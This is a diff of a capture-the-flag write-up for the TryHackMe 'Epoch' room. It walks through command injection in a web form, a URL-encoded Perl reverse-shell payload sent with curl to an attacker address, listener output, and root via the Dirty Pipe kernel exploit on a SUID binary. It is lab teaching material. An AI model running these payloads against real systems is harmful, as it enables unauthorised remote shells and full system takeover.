@@ -1,18 +1,18 @@
 # THM/Epoch ⌛
 ## Command Injection
 Normally an `nmap` scan of the target is needed but the room harbours no illusions that the entry point for this box lies on a web interface on port 80 and features a command injection vulnerability, so we'll start there.
-The web page features a simple program that allows users to convert Epoch to UTC...
-*
-Submitting anything other than a date seems to throw an `exit 1` code but after only a moment it can be seen that the `&` symbol allows users to add additional code after a date is provided:
-*
+The web page features a simple program that allows users to convert Epoch to UTC...  
+![alt text](https://github.com/p1ckzi/CTFs/blob/main/THM-Epoch/epoch-to-utc-converter.png)  
+Submitting anything other than a date seems to throw an `exit 1` code but after only a moment it can be seen that the `&` symbol allows users to add additional code after a date is provided:  
+![alt text](https://github.com/p1ckzi/CTFs/blob/main/THM-Epoch/command-injection-1.png)  
 No interception of the request was needed via Burp Suite. Already we have command injection.
 ## 🦶 Foothold
 At this point we can navigate the system to some degree just using command injection but having a shell on the system makes our life much easier.  
 The `which` command was used to try to find common programs like netcat for this purpose of creating a reverse shell but it appears these are unavailable to us since searching for programs like `nc`, `netcat`, `socat`, `python`, etc, all throw `exit 1` errors.  
-However `perl` is available and we can see this by using `which perl`:
-*
+However `perl` is available and we can see this by using `which perl`:  
+![alt text](https://github.com/p1ckzi/CTFs/blob/main/THM-Epoch/command-injection-2.png)  
 A reverse shell can be created with `perl`.  
-A popular resource for reverse shells is pentest monkey's reverse shell cheat sheet: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet which includes one per `perl`.
+A popular resource for reverse shells is pentest monkey's reverse shell cheat sheet: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet which includes one for `perl`.
 In our terminal we set up a listener on port 9999 with `nc`:  
 ```
 nc -lnvp 9999
@@ -23,7 +23,7 @@ curl http://10.10.227.130/?epoch=2022%26perl+-e+%27use+Socket%3B%24i%3D%2210.14.
 ```
 We now have a foothold on the machine as the user *challenge*.
 ### Terminal output:
-```shell
+```
 ┌──(p1ckzi㉿kali)-[~]                                                                     
 └─$ nc -lnvp 9999                                                                         
 Ncat: Version 7.93 ( https://nmap.org/ncat )                                               
@@ -40,7 +40,7 @@ challenge
 Simple enumeration finds us the only flag we need for this box. We can do this will common tools such as `linpeas.sh` available at https://github.com/carlospolop/PEASS-ng/releases/download/20221106/linpeas.sh.  
 But requesting the environment variables finds us the flag with the `env` command.
 ### Terminal Output:
-```shell
+```
 $ env                                                                                     
 HOSTNAME=e7c1352e71ec                                                                     
 SHLVL=1                                           
@@ -59,7 +59,7 @@ If the latest `linpeas.sh` was used you'll see that the box is vulnerable to `CV
 A good a resource on this can be found at https://sysdig.com/blog/cve-2022-0847-dirty-pipe-sysdig/.  
 The vulnerability exists in kernel versions between v5.8 and v5.15 and this can be identified using the `uname -r` command which shows that indeed, the box is running an older version...
 ### Terminal Output:
-```shell
+```
 $ uname -r                                        
 5.13.0-1014-aws
 ```
@@ -80,7 +80,7 @@ find / -perm -u=s -type f 2>/dev/null
 There's many resources for linux privilege escalation. One great one with many different techniques is https://book.hacktricks.xyz/linux-hardening/privilege-escalation and goes into depth on escalation using SUID binaries.
 For our purpose we'll just use the first `/usr/bin/chfn` binary.
 ### Terminal Output:
-```shell
+```
 $ find / -perm -u=s -type f 2>/dev/null                                                             
 /usr/bin/chfn                                     
 /usr/bin/umount                                   
@@ -98,7 +98,7 @@ chmod +x dirty
 ```
 We now have root on the box.
 ### Terminal output:
-```shell
+```
 $ ./dirty
 Usage: ./dirty SUID
 $ ./dirty /usr/bin/chfn
